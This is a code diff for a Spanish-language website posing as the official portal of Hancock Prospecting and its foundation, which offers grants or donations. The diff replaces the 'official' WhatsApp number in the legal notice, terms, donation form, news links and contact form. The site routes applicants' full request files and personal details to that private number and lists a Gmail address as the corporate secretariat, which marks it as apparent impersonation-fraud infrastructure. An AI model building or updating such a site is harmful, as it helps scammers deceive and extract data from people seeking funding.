@@ -310,7 +310,7 @@ const LEGAL_TEXTS = {
       Forma jurídica: Proprietary Limited Company (Constituida bajo las leyes de Australia)<br>
       ACN: 008 676 417 | ABN: 69 008 676 417<br>
       Sede corporativa: 28-42 Ventnor Avenue, West Perth, Western Australia (WA 6005), Australia.<br>
-      Teléfono / WhatsApp oficial: +33 7 57 75 40 14<br>
+      Teléfono / WhatsApp oficial: +30 6994068418<br>
       Correo electrónico de secretaría: prospectinghancock0@gmail.com<br>
       Directora de la publicación: Mrs. Gina Rinehart AO (Presidenta Ejecutiva / Executive Chairman)</p>
 
@@ -349,7 +349,7 @@ const LEGAL_TEXTS = {
       <p>Las presentes condiciones rigen el acceso y uso del portal oficial de Hancock Prospecting PTY LTD y de su Fundación. La navegación por el sitio o la cumplimentación del formulario de subvenciones implica la aceptación plena de estos términos.</p>
 
       <h4>2. Procedimiento de Solicitud de Donación</h4>
-      <p>Toda solicitud formulada a través del formulario interactivo genera un número de expediente institucional único. Dicha solicitud es remitida directamente a nuestra secretaría ejecutiva mediante el canal oficial de WhatsApp (+33 7 57 75 40 14) para su registro, validación documental y posterior evaluación técnica.</p>
+      <p>Toda solicitud formulada a través del formulario interactivo genera un número de expediente institucional único. Dicha solicitud es remitida directamente a nuestra secretaría ejecutiva mediante el canal oficial de WhatsApp (+30 6994068418) para su registro, validación documental y posterior evaluación técnica.</p>
 
       <h4>3. Veracidad de la Información</h4>
       <p>El solicitante certifica bajo juramento que toda la documentación y datos consignados en su expediente oficial son auténticos, verificables y responden fielmente a la realidad del proyecto presentado.</p>
@@ -1083,7 +1083,7 @@ function sendDonToWhatsApp() {
 
   const message = getStructuredExpedienteText();
   const encodedMessage = encodeURIComponent(message);
-  const waUrl = `https://wa.me/33757754014?text=${encodedMessage}`;
+  const waUrl = `https://wa.me/306994068418?text=${encodedMessage}`;
 
   showToast("Abriendo canal oficial de WhatsApp...", "success");
   window.open(waUrl, "_blank");
@@ -1156,7 +1156,7 @@ function renderNews() {
         <div class="news-date"><i class="fa-regular fa-calendar-check"></i> ${item.date}</div>
         <h3 class="news-title">${item.title}</h3>
         <p class="news-desc">${item.desc}</p>
-        <a href="https://wa.me/33757754014?text=Hola,%20deseo%20informaci%C3%B3n%20sobre%20el%20comunicado:%20${encodeURIComponent(item.title)}" target="_blank" class="news-link">
+        <a href="https://wa.me/306994068418?text=Hola,%20deseo%20informaci%C3%B3n%20sobre%20el%20comunicado:%20${encodeURIComponent(item.title)}" target="_blank" class="news-link">
           Consultar comunicado oficial <i class="fa-solid fa-arrow-right"></i>
         </a>
       </div>
@@ -1190,7 +1190,7 @@ function sendContactViaWhatsApp() {
   }
 
   const text = `CONSULTA INSTITUCIONAL WEB\nNombre: ${nom}\nEmail: ${email}\nAsunto: ${sujet}\nMensaje: ${msg}`;
-  const url = `https://wa.me/33757754014?text=${encodeURIComponent(text)}`;
+  const url = `https://wa.me/306994068418?text=${encodeURIComponent(text)}`;
   window.open(url, "_blank");
 }
 
